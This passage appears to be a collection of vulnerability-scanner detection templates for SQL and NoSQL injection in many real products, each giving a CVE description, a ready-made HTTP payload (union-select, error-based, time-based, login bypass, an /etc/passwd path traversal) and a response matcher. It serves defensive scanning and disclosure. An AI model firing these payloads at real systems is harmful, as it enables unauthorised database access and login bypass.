- tags - cnvd,cnvd2022,zentao,sqli
## Requests
### Step - 1
```
POST /zentao/user-login.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/zentao/user-login.html

account=admin'+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+'1'='1

```
### Matchers

**Type - word**
- part - body
- words
    1. c8c605999f3d8352d7bb792cf3fdb25

---
# 74cms - ajax_common.php SQL Injection
## Description
- SQL Injection in 74cms 3.2.0 via the query parameter to plus/ajax_common.php.

- severity - critical
- tags - cve,cve2020,74cms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/plus/ajax_common.php?act=hotword&query=aa%錦%27%20union%20select%201,md5({{num}}),3%23%27
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# SkyWalking SQLI
## Description
- When using H2/MySQL/TiDB as Apache SkyWalking storage and a metadata query through GraphQL protocol, there is a SQL injection vulnerability which allows access to unexpected data. Apache SkyWalking 6.0.0 to 6.6.0, 7.0.0 H2/MySQL/TiDB storage implementations don't use the appropriate way to set SQL parameters.

- severity - high
- tags - cve,cve2020,sqli,skywalking
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/graphql
  - {"query":"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:\"all_p99\",id:\"') UNION SELECT 1,CONCAT('~','9999999999','~')-- \",}, duration: $d){values{value}}}","variables":{"d":{"start":"2021-11-11","end":"2021-11-12","step":"DAY"}}}

### Matchers

**Type - word**
- words
    1. Content-Type: application/json
- part - header

**Type - word**
- words
    1. UNION SELECT 1,CONCAT('~','9999999999','~')--
    2. Exception while fetching data
- part - body
- condition - and

**Type - status**
- status
    1. 200

---
# Agentejo Cockpit <0.12.0 - NoSQL Injection
## Description
- Agentejo Cockpit prior to 0.12.0 is vulnerable to NoSQL Injection via the newpassword method of the Auth controller, which is responsible for displaying the user password reset form.
- severity - critical
- tags - cve,cve2020,nosqli,sqli,cockpit,injection
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/auth/newpassword
  - {
  "token": {
    "$func": "var_dump"
  }
}

### Matchers

**Type - regex**
- part - body
- regex
    1. string\([0-9]{1,3}\)(\s)?"rp-([a-f0-9-]+)"

---
# rConfig 3.9.4 - SQL Injection
## Description
- rConfig 3.9.4 and previous versions has unauthenticated compliancepolicyelements.inc.php SQL injection. Because nodes' passwords are stored by default in cleartext, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
- severity - critical
- tags - cve,cve2020,rconfig,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/compliancepolicyelements.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. [project-discovery]
- part - body

---
# Django SQL Injection
## Description
- Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allow SQL injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it is possible to break character escaping and inject malicious SQL.
- severity - high
- tags - cve,cve2020,django,sqli,vulhub
## Requests
- Method - GET
### URL
- {{BaseURL}}/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
### Matchers

**Type - word**
- words
    1. DatabaseError at
    2. ORA-29257:
    3. ORA-06512:
    4. Request Method:
- condition - and

---
# PHPGurukul Dairy Farm Shop Management System 1.0 - SQL Injection
## Description
- PHPGurukul Dairy Farm Shop Management System 1.0 is vulnerable to SQL injection, as demonstrated by the username parameter in index.php, the category and CategoryCode parameters in add-category.php, the CompanyName parameter in add-company.php, and the ProductName and ProductPrice parameters in add-product.php.
- severity - critical
- tags - sqli,edb,cve,cve2020
## Requests
### Step - 1
```
POST /dfsms/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=A&login=

```
### Matchers

**Type - word**
- part - header
- words
    1. add-category.php

**Type - status**
- status
    1. 302

---
# vBulletin SQL Injection
## Description
- vBulletin before 5.5.6pl1, 5.6.0 before 5.6.0pl1, and 5.6.1 before 5.6.1pl1 has incorrect access control that permits SQL injection attacks.
- severity - critical
- tags - cve2020,vbulletin,sqli,packetstorm,cve
## Requests
### Step - 1
```
POST /ajax/api/content_infraction/getIndexableContent HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Accept: */*
Content-Type: application/x-www-form-urlencoded

nodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-

```
### Matchers

**Type - word**
- words
    1. vbulletinrce

---
# CSE Bookstore 1.0 - SQL Injection
## Description
- CSE Bookstore version 1.0 is vulnerable to time-based blind, boolean-based blind and OR error-based SQL injection in pubid parameter in bookPerPub.php. A successful exploitation of this vulnerability will lead to an attacker dumping the entire database.
- severity - critical
- tags - cve,cve2020,sqli,cse,edb,tenable
## Requests
### Step - 1
```
GET /ebook/bookPerPub.php?pubid=4' HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. get book price failed! You have an error in your SQL syntax
    2. Can't retrieve data You have an error in your SQL syntax
- condition - or

---
# WordPress PayPal Pro <1.1.65 - SQL Injection
## Description
- WordPress PayPal Pro plugin before 1.1.65 is susceptible to SQL injection via the 'query' parameter which allows for any unauthenticated user to perform SQL queries with the results output to a web page in JSON format.
- severity - critical
- tags - wp-plugin,sqli,paypal,wpscan,cve,cve2020,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users
### Matchers

**Type - word**
- words
    1. text/html
- part - header

**Type - word**
- words
    1. "user_login"
    2. "user_email"
    3. "user_pass"
    4. "user_activation_key"
- condition - and
- part - body

**Type - status**
- status
    1. 200

---
# 74cms - ajax_street.php 'key' SQL Injection
## Description
- SQL Injection in 74cms 3.2.0 via the key parameter to plus/ajax_street.php.

- severity - critical
- tags - cve,cve2020,74cms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/plus/ajax_street.php?act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5({{num}}),9%23
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# Hospital Management System 4.0 - SQL Injection
## Description
- Hospital Management System 4.0 contains multiple SQL injection vulnerabilities because multiple pages and parameters do not validate user input. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve2020,hms,cms,sqli,authenticated,edb,cve
## Requests
### Step - 1
```
POST /hospital/hms/doctor/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}password={{password}}&submit=&submit=

```
### Step - 2
```
POST /hospital/hms/doctor/search.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

searchdata='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT(md5({{num}}),1),2),NULL--+PqeG&search=

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5(num)}}

**Type - status**
- status
    1. 200

---
# Agentejo Cockpit < 0.11.2 - NoSQL Injection
## Description
- Agentejo Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php check function. The $eq operator matches documents where the value of a field equals the specified value.
- severity - critical
- tags - cve,cve2020,nosqli,sqli,cockpit,injection
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/auth/check
  - {
  "auth": {
    "user": {
      "$eq": "admin"
    },
    "password": [
      0
    ]
  }
}

### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. password_verify() expects parameter

---
# rConfig 3.9.4 - SQL Injection
## Description
- rConfig 3.9.4 and previous versions have unauthenticated devices.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
- severity - critical
- tags - cve,cve2020,rconfig,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/devices.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+&searchColumn=n.id&searchOption=contains
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. [project-discovery]
- part - body

---
# 74cms - ajax_officebuilding.php SQL Injection
## Description
- A SQL injection vulnerability exists in 74cms 3.2.0 via the x parameter to ajax_officebuilding.php.

- severity - critical
- tags - cve,cve2020,74cms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{num}}),5,6,7,8,9%23
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# Sourcecodester Hotel and Lodge Management System 2.0 - SQL Injection
## Description
- Sourcecodester Hotel and Lodge Management System 2.0 is vulnerable to unauthenticated SQL injection and can allow remote attackers to execute arbitrary SQL commands via the email parameter to the edit page for Customer, Room, Currency, Room Booking Details, or Tax Details.

- severity - critical
- tags - cve,cve2020,hotel,sqli,unauth
## Requests
### Step - 1
```
POST /forgot_password.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

btn_forgot=1&email=1%27%20or%20sleep(6)%23

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=6
    2. status_code == 200
    3. contains(body, "Hotel Booking System")
- condition - and

---
# OpenSIS 7.3 - SQL Injection
## Description
- OpenSIS Community Edition version 7.3 is vulnerable to SQL injection via the USERNAME parameter of index.php.
- severity - critical
- tags - cve,cve2020,sqli,opensis
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/account/index.php
- {{BaseURL}}/opensis/index.php
- {{BaseURL}}/index.php
  - USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=

### Matchers

**Type - word**
- part - body
- words
    1. SQL STATEMENT:
    2. <TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;-- -')</TD>
- condition - and

**Type - word**
- part - header
- words
    1. text/html
- condition - and

**Type - status**
- status
    1. 200

---
# PrestaShop ProductComments < 4.2.0 - SQL Injection
## Description
- In the PrestaShop module "productcomments" before version 4.2.1, an attacker can use a Blind SQL injection to retrieve data or stop the MySQL service. The problem is fixed in 4.2.1 of the module.

- severity - high
- tags - cve,cve2020,sqli,prestshop,packetstorm
## Requests
### Step - 1
```
@timeout: 20s
GET /index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(6)))a) HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=6
    2. status_code == 200
    3. contains(content_type, "application/json")
    4. contains(body, "average_grade")
- condition - and

---
# Agentejo Cockpit <0.11.2 - NoSQL Injection
## Description
- Agentejo Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php resetpassword function of the Auth controller.
- severity - critical
- tags - cve,cve2020,nosqli,sqli,cockpit,injection
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/auth/requestreset
  - {
  "user": {
    "$func": "var_dump"
  }
}

### Matchers

**Type - regex**
- part - body
- regex
    1. string\([0-9]{1,3}\)(\s)?"([A-Za-z0-9]+)"

---
# rConfig 3.9.4 - SQL Injection
## Description
- rConfig 3.9.4 and previous versions have unauthenticated compliancepolicies.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
- severity - critical
- tags - cve,cve2020,rconfig,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/compliancepolicies.inc.php?search=True&searchColumn=policyName&searchOption=contains&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL+--+
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. [project-discovery]
- part - body

---
# rConfig <=3.9.4 - SQL Injection
## Description
- rConfig 3.9.4 and prior has unauthenticated snippets.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
- severity - critical
- tags - cve,cve2020,rconfig,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/snippets.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. [project-discovery]
- part - body

---
# Multi Restaurant Table Reservation System 1.0 - SQL Injection
## Description
- The file view-chair-list.php in Multi Restaurant Table Reservation System 1.0 does not perform input validation on the table_id parameter which allows unauthenticated SQL Injection. An attacker can send malicious input in the GET request to /dashboard/view-chair-list.php?table_id= to trigger the vulnerability.

- severity - critical
- tags - cve2020,tablereservation,sqli,unauth,edb,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/dashboard/view-chair-list.php?table_id='+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-
### Matchers

**Type - dsl**
- dsl
    1. duration>=6

**Type - word**
- part - body
- words
    1. Restaurent Tables
    2. Chair List
- condition - and

**Type - status**
- status
    1. 200

---
# 74cms - ajax_street.php 'x' SQL Injection
## Description
- SQL Injection in 74cms 3.2.0 via the x parameter to plus/ajax_street.php.

- severity - critical
- tags - cve,cve2020,74cms,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/plus/ajax_street.php?act=alphabet&x=11�%27%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5({{num}}),9%20from%20qs_admin#
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# Zabbix - SQL Injection
## Description
- Zabbix before 2.2.14 and 3.0 before 3.0.4 allows remote attackers to execute arbitrary SQL commands via the toggle_ids array parameter in latest.php and perform SQL injection attacks.
- severity - critical
- tags - cve,cve2016,zabbix,sqli,vulhub
## Requests
- Method - GET
### URL
- {{BaseURL}}/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::
### Matchers

**Type - word**
- part - body
- words
    1. Error in query [INSERT INTO profiles (profileid, userid
    2. You have an error in your SQL syntax
- condition - and

**Type - status**
- status
    1. 200

---
# WordPress zm-gallery plugin 1.0 SQL Injection
## Description
- zm-gallery plugin 1.0 for WordPress is susceptible to SQL injection via the order parameter.
- severity - high
- tags - wpscan,cve,cve2016,sqli,wp,wordpress,wp-plugin,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7422)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7421)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_1 == 302 && status_code_2 == 200 && status_code_3 == 200
    2. contains(body_2, "[zm_gallery id=")
    3. contains(body_2, "<th scope=\"row\" class=\"check-column\">")
    4. !contains(body_3, "<th scope=\"row\" class=\"check-column\">")
- condition - and

---
# Joomla! JCK Editor SQL Injection
## Description
- The JCK Editor component 6.4.4 for Joomla! allows SQL Injection via the jtreelink/dialogs/links.php parent parameter.
- severity - critical
- tags - cve,cve2018,packetstorm,edb,joomla,sqli
## Requests
### Step - 1
```
GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x6e75636c65692d74656d706c617465),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}

```
### Matchers

**Type - word**
- part - body
- words
    1. nuclei-template

---
# Opencart Divido - Sql Injection
## Description
- OpenCart Divido plugin is susceptible to SQL injection

- severity - high
- tags - cve,cve2018,opencart,sqli
## Requests
### Step - 1
```
POST /upload/index.php?route=extension/payment/divido/update HTTP/1.1
Host: {{Hostname}}

{"metadata":{"order_id":"1 and updatexml(1,concat(0x7e,(SELECT md5({{num}})),0x7e),1)"},"status":2}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# Joomla! <3.7.1 - SQL Injection
## Description
- Joomla! before 3.7.1 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2017,joomla,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5({{num}})),1)
### Matchers

**Type - word**
- part - body
- words
    1. {{md5(num)}}

---
# Subrion CMS <4.1.5.10 - SQL Injection
## Description
- Subrion CMS before 4.1.5.10 has a SQL injection vulnerability in /front/search.php via the $_GET array.
- severity - critical
- tags - cve,cve2017,sqli,subrion
## Requests
- Method - GET
### URL
- {{BaseURL}}/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1
### Matchers

**Type - word**
- words
    1. projectdiscovery.io
- part - body

**Type - status**
- status
    1. 200

---
# Gogs (Go Git Service) - SQL Injection
## Description
- Multiple SQL injection vulnerabilities in Gogs (aka Go Git Service) 0.3.1-9 through 0.5.x before 0.5.6.1105 Beta allow remote attackers to execute arbitrary SQL commands via the q parameter to (1) api/v1/repos/search, which is not properly handled in models/repo.go, or (2) api/v1/users/search, which is not properly handled in models/user.go.
- severity - critical
- tags - gogs,seclists,packetstorm,edb,cve,cve2014,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27
### Matchers

**Type - word**
- part - body
- words
    1. "ok":true
    2. "data"
    3. "repolink":"
- condition - and

**Type - status**
- status
    1. 200

---
# Drupal SQL Injection
## Description
- The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing specially crafted keys.
- severity - high
- tags - edb,cve,cve2014,drupal,sqli
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/?q=node&destination=node
  - pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5({{num}})),1)%23]=bob&name[0]=a
### Matchers

**Type - word**
- words
    1. PDOException
    2. {{md5({{num}})}}
- condition - and
- part - body

**Type - status**
- status
    1. 500

---
# Lighttpd 1.4.34 SQL Injection and Path Traversal
## Description
- A SQL injection vulnerability in mod_mysql_vhost.c in lighttpd before 1.4.35 allows remote attackers to execute arbitrary SQL commands via the host name (related to request_check_hostname).
- severity - critical
- tags - lighttpd,injection,seclists,cve,cve2014,sqli
## Requests
### Step - 1
```
GET /etc/passwd HTTP/1.1
Host: [::1]' UNION SELECT '/


```
### Matchers

**Type - regex**
- regex
    1. root:[x*]:0:0:

---
# Online Event Booking and Reservation System 2.3.0 - SQL Injection
## Description
- Online Event Booking and Reservation System 2.3.0 contains a SQL injection vulnerability in event-management/views. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2021,sqli,authenticated
## Requests
### Step - 1
```
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

name={{username}}&pwd={{password}}

```
### Step - 2
```
GET /views/?v=USER&ID=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2Cmd5({{num}})%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%3B--%20- HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5(num)}}

**Type - status**
- status
    1. 200

---
# PuneethReddyHC Online Shopping System homeaction.php SQL Injection
## Description
- An unauthenticated SQL injection vulnerability exists in PuneethReddyHC Online Shopping System through the /homeaction.php cat_id parameter. Using a post request does not sanitize the user input.
- severity - critical
- tags - cve,cve2021,sqli,injection
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/homeaction.php
  - cat_id=4'&get_seleted_Category=1
### Matchers

**Type - word**
- words
    1. text/html
- part - header

**Type - word**
- words
    1. Warning: mysqli_num_rows() expects parameter 1 to be
    2. xdebug-error xe-warning
- part - body
- condition - and

**Type - status**
- status
    1. 200

---
# WordPress Car Seller - Auto Classifieds Script - SQL Injection
## Description
- The request_list_request AJAX call of the Car Seller - Auto Classifieds Script WordPress plugin through 2.1.0, available to both authenticated and unauthenticated users, does not sanitize, validate or escape the order_id POST parameter before using it in a SQL statement, leading to a SQL injection issue.
- severity - critical
- tags - cve2021,wordpress,wp-plugin,sqli,wpscan,cve
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=request_list_request&order_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x685741416c436654694d446d416f717a6b54704a457a5077564653614970664166646654696e724d,0x7171786b71),NULL-- -

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. qzvvqhWAAlCfTiMDmAoqzkTpJEzPwVFSaIpfAfdfTinrMqqxkq
- part - body

---
# WordPress Visitor Statistics (Real Time Traffic) <4.8 -SQL Injection
## Description
- WordPress Visitor Statistics (Real Time Traffic) plugin before 4.8 does not properly sanitize and escape the refUrl in the refDetails AJAX action, which is available to any authenticated user. This could allow users with a role as low as subscriber to perform SQL injection attacks.
- severity - high
- tags - authenticated,wpscan,cve,cve2021,sqli,wp,wordpress,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin-ajax.php?action=refDetails&requests=%7B%22refUrl%22:%22'%20union%20select%201,1,md5({{num}}),4--%20%22%7D HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# PuneethReddyHC action.php SQL Injection
## Description
- An unauthenticated SQL injection vulnerability exists in PuneethReddyHC Online Shopping through the /action.php prId parameter. Using a post request does not sanitize the user input.
- severity - high
- tags - cve,cve2021,sqli,injection
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/action.php
  - proId=1'&addToCart=1
### Matchers

**Type - word**
- words
    1. text/html
- part - header

**Type - word**
- words
    1. Warning: mysqli_num_rows() expects parameter 1 to be
    2. xdebug-error xe-warning
- part - body
- condition - and

**Type - status**
- status
    1. 200

---
# Layer5 Meshery 0.5.2 - SQL Injection
## Description
- Layer5 Meshery 0.5.2 contains a SQL injection vulnerability in the REST API that allows an attacker to execute arbitrary SQL commands via the /experimental/patternfiles endpoint (order parameter in GetMesheryPatterns in models/meshery_pattern_persister.go).
- severity - critical
- tags - sqli,cve,cve2021
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/experimental/patternfile?order=id%3Bselect(md5({{num}}))&page=0&page_size=0
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}
- part - body

**Type - status**
- status
    1. 200

---
# PrestaShop SmartBlog <4.0.6- SQL Injection
## Description
- PrestaShop SmartBlog by SmartDataSoft < 4.0.6 is vulnerable to a SQL injection vulnerability in the blog archive functionality.
- severity - critical
- tags - cve,cve2021,prestashop,smartblog,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. c5fe25896e49ddfe996db7508cf00534
- part - body

---
# Simple Client Management System 1.0 - SQL Injection
## Description
- SQL Injection vulnerability exists in Sourcecodester Simple Client Management System 1.0 via the username field in login.php.

- severity - critical
- tags - cve,cve2021,simpleclientmanagement,sqli,auth-bypass
## Requests
### Step - 1
```
POST /classes/Login.php?f=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin'+or+'1'%3d'1'--+-&password=as

```
### Step - 2
```
GET / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_1, "text/html")
    2. status_code_1 == 200
    3. contains(body_1, "{\"status\":\"success\"}")
    4. contains(body_2, "Welcome to Simple Client")
- condition - and

---
# BillQuick Web Suite SQL Injection
## Description
- BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1 allows SQL injection for unauthenticated remote code execution. Successful exploitation can include the ability to execute arbitrary code as MSSQLSERVER$ via xp_cmdshell.
- severity - critical
- tags - cve,cve2021,sqli,billquick,kev
## Requests
### Step - 1
```
GET / HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
POST / HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode("Â{{VSÂ}}")}}&__VIEWSTATEGENERATOR={{url_encode("Â{{VSGÂ}}")}}&__EVENTVALIDATION={{url_encode("Â{{EVÂ}}")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96

```
### Matchers

**Type - word**
- part - body
- condition - and
- words
    1. System.Data.SqlClient.SqlException
    2. Incorrect syntax near
    3. _ACCOUNTLOCKED
### Extractors

**Type - xpath**
- name - VS
- internal - True
- attribute - value
- xpath
    1. /html/body/form/div/input[@id='__VIEWSTATE']

**Type - xpath**
- name - VSG
- internal - True
- attribute - value
- xpath
    1. /html/body/form/div/input[@id='__VIEWSTATEGENERATOR']

**Type - xpath**
- name - EV
- internal - True
- attribute - value
- xpath
    1. /html/body/form/div/input[@id='__EVENTVALIDATION']

---
# PrestaShop 1.7.7.0 SQL Injection
## Description
- The store system in PrestaShop 1.7.7.0 allows time-based boolean SQL injection via the module=productcomments controller=CommentGrade id_products[] parameter.

- severity - critical
- tags - cve,cve2021,sqli,prestshop,edb
## Requests
### Step - 1
```
@timeout: 20s
GET /index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(6)))xoOt) HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=6
    2. status_code == 200
    3. contains(content_type, "application/json")
    4. contains(body, "average_grade")
- condition - and

---
# WordPress Perfect Survey<1.5.2 - SQL Injection
## Description
